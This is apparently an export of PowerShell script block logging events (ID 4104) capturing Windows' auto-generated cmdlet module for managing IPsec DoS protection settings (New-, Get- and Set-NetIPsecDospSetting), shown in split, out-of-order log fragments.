          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PrivateInterfaceAliases'; ParameterType = 'System.Management.Automation.WildcardPattern[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('PublicV6Address')) {
          [object]$__cmdletization_value = ${PublicV6Address}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PublicV6Address'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PublicV6Address'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('PrivateV6Address')) {
          [object]$__cmdletization_value = ${PrivateV6Address}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PrivateV6Address'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PrivateV6Address'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

      $__cmdletization_returnValue = $null
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('cim:CreateInstance', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetIPsecDospSetting.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'New-NetIPsecDospSetting' -Alias '*'
        

function Get-NetIPsecDospSetting
{
    [CmdletBinding(DefaultParameterSetName='GetAll', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetIPsecDoSPSetting')]

    param(
    
    [Parameter(ParameterSetName='ByName', Mandatory=$true, Position=0)]
    [ValidateNotNull()]
    [string[]]
    ${Name},

    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${All},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='GetAll')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='GetAll')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${AsJob})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('Name') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Name})
        $__cmdletization_queryBuilder.FilterByProperty('ElementName', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('All') -and (@('GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('All', ${All})
    }


    $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder)
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetIPsecDospSetting.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Get-NetIPsecDospSetting' -Alias '*'
        

function Set-NetIPsecDospSetting
{
    [CmdletBinding(SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetIPsecDoSPSetting')]

    param(
    
    [Parameter(ParameterSetName='ByName', Mandatory=$true, Position=0)]
    [ValidateNotNull()]
    [string[]]
    ${Name},

    [Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_NetIPsecDoSPSetting')]
    [ValidateNotNull()]
    [ciminstance[]]
    ${InputObject},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [uint32]
    ${StateIdleTimeoutSeconds},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [uint32]
    ${PerIPRateLimitQueueIdleTimeoutSeconds},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [uint32]
    ${IpV6IPsecUnauthDscp},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [uint32]
    ${IpV6IPsecUnauthRateLimitBytesPerSec},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [uint32]
    ${IpV6IPsecUnauthPerIPRateLimitBytesPerSec},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [uint16]
    ${IpV6IPsecAuthDscp},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [uint32]
    ${IpV6IPsecAuthRateLimitBytesPerSec},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [uint16]
    ${IcmpV6Dscp},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [uint32]
    ${IcmpV6RateLimitBytesPerSec},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [uint32]
    ${IpV6FilterExemptDscp},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [uint32]
    ${IpV6FilterExemptRateLimitBytesPerSec},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [uint16]
    ${DefBlockExemptDscp},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [uint32]
    ${DefBlockExemptRateLimitBytesPerSec},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [uint32]
    ${MaxStateEntries},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [uint32]
    ${MaxPerIPRateLimitQueues},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.DospKeyModules]
    ${EnabledKeyingModules},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.D

ScriptBlock ID: 641bc2d7-07d8-4b2d-b3f4-ec7978cbe7dc
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (2 of 6):
    }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('IpV6IPsecAuthDscp')) {
          [object]$__cmdletization_value = ${IpV6IPsecAuthDscp}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IpV6IPsecAuthDscp'; ParameterType = 'System.UInt16'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IpV6IPsecAuthDscp'; ParameterType = 'System.UInt16'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('IpV6IPsecAuthRateLimitBytesPerSec')) {
          [object]$__cmdletization_value = ${IpV6IPsecAuthRateLimitBytesPerSec}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IpV6IPsecAuthRateLimitBytesPerSec'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IpV6IPsecAuthRateLimitBytesPerSec'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('IcmpV6Dscp')) {
          [object]$__cmdletization_value = ${IcmpV6Dscp}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IcmpV6Dscp'; ParameterType = 'System.UInt16'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IcmpV6Dscp'; ParameterType = 'System.UInt16'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('IcmpV6RateLimitBytesPerSec')) {
          [object]$__cmdletization_value = ${IcmpV6RateLimitBytesPerSec}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IcmpV6RateLimitBytesPerSec'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IcmpV6RateLimitBytesPerSec'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('IpV6FilterExemptDscp')) {
          [object]$__cmdletization_value = ${IpV6FilterExemptDscp}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IpV6FilterExemptDscp'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IpV6FilterExemptDscp'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('IpV6FilterExemptRateLimitBytesPerSec')) {
          [object]$__cmdletization_value = ${IpV6FilterExemptRateLimitBytesPerSec}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IpV6FilterExemptRateLimitBytesPerSec'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IpV6FilterExemptRateLimitBytesPerSec'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DefBlockExemptDscp')) {
          [object]$__cmdletization_value = ${DefBlockExemptDscp}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DefBlockExemptDscp'; ParameterType = 'System.UInt16'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DefBlockExemptDscp'; ParameterType = 'System.UInt16'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DefBlockExemptRateLimitBytesPerSec')) {
          [object]$__cmdletization_value = ${DefBlockExemptRateLimitBytesPerSec}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DefBlockExemptRateLimitBytesPerSec'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DefBlockExemptRateLimitBytesPerSec'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('MaxStateEntries')) {
          [object]$__cmdletization_value = ${MaxStateEntries}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MaxStateEntries'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MaxStateEntries'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('MaxPerIPRateLimitQueues')) {
          [object]$__cmdletization_value = ${MaxPerIPRateLimitQueues}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MaxPerIPRateLimitQueues'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MaxPerIPRateLimitQueues'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('EnabledKeyingModules')) {
          [object]$__cmdletization_value = ${EnabledKeyingModules}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnabledKeyingModules'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.DospKeyModules'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnabledKeyingModules'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.DospKeyModules'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('FilteringFlags')) {
          [object]$__cmdletization_value = ${FilteringFlags}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'FilteringFlags'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.DospFlags'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'FilteringFlags'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.DospFlags'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('PublicInterfaceAliases')) {
          [object]$__cmdletization_value = ${PublicInterfaceAli

ScriptBlock ID: 641bc2d7-07d8-4b2d-b3f4-ec7978cbe7dc
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (1 of 6):

#requires -version 3.0

try { Microsoft.PowerShell.Core\Set-StrictMode -Off } catch { }

$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module

$script:ClassName = 'root/standardcimv2/MSFT_NetIPsecDoSPSetting'
$script:ClassVersion = '1.0.0'
$script:ModuleVersion = '1.0.0.0'
$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]

$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()

Microsoft.PowerShell.Core\Export-ModuleMember -Function @()
        

function __cmdletization_BindCommonParameters
{
    param(
        $__cmdletization_objectModelWrapper,
        $myPSBoundParameters
    )       
                

        if ($myPSBoundParameters.ContainsKey('CimSession')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('AsJob')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] 
        }
                    

}
                

function New-NetIPsecDospSetting
{
    [CmdletBinding(SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]
    
    
    param(
    
    [Parameter(ParameterSetName='cim:CreateInstance0', Mandatory=$true)]
    [string]
    ${Name},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [uint32]
    ${StateIdleTimeoutSeconds},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [uint32]
    ${PerIPRateLimitQueueIdleTimeoutSeconds},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [uint32]
    ${IpV6IPsecUnauthDscp},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [uint32]
    ${IpV6IPsecUnauthRateLimitBytesPerSec},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [uint32]
    ${IpV6IPsecUnauthPerIPRateLimitBytesPerSec},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [uint16]
    ${IpV6IPsecAuthDscp},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [uint32]
    ${IpV6IPsecAuthRateLimitBytesPerSec},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [uint16]
    ${IcmpV6Dscp},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [uint32]
    ${IcmpV6RateLimitBytesPerSec},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [uint32]
    ${IpV6FilterExemptDscp},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [uint32]
    ${IpV6FilterExemptRateLimitBytesPerSec},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [uint16]
    ${DefBlockExemptDscp},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [uint32]
    ${DefBlockExemptRateLimitBytesPerSec},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [uint32]
    ${MaxStateEntries},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [uint32]
    ${MaxPerIPRateLimitQueues},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.DospKeyModules]
    ${EnabledKeyingModules},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.DospFlags]
    ${FilteringFlags},

    [Parameter(ParameterSetName='cim:CreateInstance0', Mandatory=$true)]
    [WildcardPattern[]]
    ${PublicInterfaceAliases},

    [Parameter(ParameterSetName='cim:CreateInstance0', Mandatory=$true)]
    [WildcardPattern[]]
    ${PrivateInterfaceAliases},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string]
    ${PublicV6Address},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string]
    ${PrivateV6Address},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [switch]
    ${AsJob})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('Name')) {
          [object]$__cmdletization_value = ${Name}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ElementName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ElementName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('StateIdleTimeoutSeconds')) {
          [object]$__cmdletization_value = ${StateIdleTimeoutSeconds}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'StateIdleTimeoutSeconds'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'StateIdleTimeoutSeconds'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('PerIPRateLimitQueueIdleTimeoutSeconds')) {
          [object]$__cmdletization_value = ${PerIPRateLimitQueueIdleTimeoutSeconds}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PerIPRateLimitQueueIdleTimeoutSeconds'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PerIPRateLimitQueueIdleTimeoutSeconds'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('IpV6IPsecUnauthDscp')) {
          [object]$__cmdletization_value = ${IpV6IPsecUnauthDscp}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IpV6IPsecUnauthDscp'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IpV6IPsecUnauthDscp'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('IpV6IPsecUnauthRateLimitBytesPerSec')) {
          [object]$__cmdletization_value = ${IpV6IPsecUnauthRateLimitBytesPerSec}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IpV6IPsecUnauthRateLimitBytesPerSec'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IpV6IPsecUnauthRateLimitBytesPerSec'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('IpV6IPsecUnauthPerIPRateLimitBytesPerSec')) {
          [object]$__cmdletization_value = ${IpV6IPsecUnauthPerIPRateLimitBytesPerSec}
